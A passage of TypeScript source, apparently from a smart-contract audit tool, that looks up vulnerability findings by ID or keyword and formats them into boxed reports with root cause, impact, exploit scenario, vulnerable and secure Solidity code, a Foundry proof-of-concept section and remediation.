    "merkle proof": "CUSTOM-029",
  };

  for (const [keyword, id] of Object.entries(keywordMap)) {
    if (q.includes(keyword)) {
      return FINDING_DATABASE[id];
    }
  }

  return undefined;
}

// ============================================================================
// Main Function
// ============================================================================

export async function explainFinding(input: ExplainFindingInput): Promise<string> {
  logger.info(`[explainFinding] Explaining: ${input.findingId}`);

  const explanation = findExplanation(input.findingId);

  if (!explanation) {
    return formatNotFound(input.findingId);
  }

  return formatExplanation(explanation, input.contractContext);
}

// ============================================================================
// Output Formatting
// ============================================================================

function formatNotFound(query: string): string {
  const available = Object.keys(FINDING_DATABASE).join(", ");
  return [
    "═══════════════════════════════════════════════════════════════════════════════",
    `  FINDING NOT FOUND: "${query}"`,
    "═══════════════════════════════════════════════════════════════════════════════",
    "",
    `  No explanation found for "${query}".`,
    "",
    "  Available finding IDs:",
    `  ${available}`,
    "",
    "  You can also search by keyword:",
    "  reentrancy, tx.origin, overflow, underflow, pragma, unchecked return,",
    "  timestamp, delegatecall, array length, zero address, missing events,",
    "  replay, nonce, encodepacked, hash collision, precision loss, permit,",
    "  access control, merkle, airdrop, flash loan, oracle, erc-7702,",
    "  paymaster, erc-4337, account abstraction",
    "",
    "  Example: explain_finding({ findingId: 'reentrancy' })",
    "═══════════════════════════════════════════════════════════════════════════════",
  ].join("\n");
}

function formatExplanation(exp: FindingExplanation, context?: string): string {
  const severityEmoji: Record<string, string> = {
    critical: "🔴",
    high: "🟠",
    medium: "🟡",
    low: "🔵",
    informational: "⚪",
  };
  const emoji = severityEmoji[exp.severity] ?? "⚪";

  const lines: string[] = [];

  lines.push("═══════════════════════════════════════════════════════════════════════════════");
  lines.push(`  ${emoji} [${exp.id}] ${exp.title}`);
  lines.push(`  Severity: ${exp.severity.toUpperCase()}`);
  if (context) {
    lines.push(`  Context: ${context}`);
  }
  lines.push("═══════════════════════════════════════════════════════════════════════════════");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  ROOT CAUSE                                                                 │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push(`  ${exp.rootCause}`);
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  IMPACT                                                                     │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push(`  ${exp.impactDescription}`);
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  EXPLOIT SCENARIO                                                           │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  for (const step of exp.exploitScenario) {
    lines.push(`  ${step}`);
  }
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  VULNERABLE CODE                                                            │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push("  ```solidity");
  for (const codeLine of exp.vulnerableCode.split("\n")) {
    lines.push(`  ${codeLine}`);
  }
  lines.push("  ```");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  SECURE CODE                                                                │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push("  ```solidity");
  for (const codeLine of exp.secureCode.split("\n")) {
    lines.push(`  ${codeLine}`);
  }
  lines.push("  ```");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  FOUNDRY PROOF OF CONCEPT                                                   │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push("  ```solidity");
  for (const codeLine of exp.pocTemplate.split("\n")) {
    lines.push(`  ${codeLine}`);
  }
  lines.push("  ```");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  REMEDIATION                                                                │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  for (const step of exp.remediation) {
    lines.push(`  • ${step}`);
  }
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  REFERENCES                                                                 │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  for (const ref of exp.references) {
    lines.push(`  - ${ref}`);
  }
  lines.push("");

  lines.push("═══════════════════════════════════════════════════════════════════════════════");

  return lines.join("\n");
}
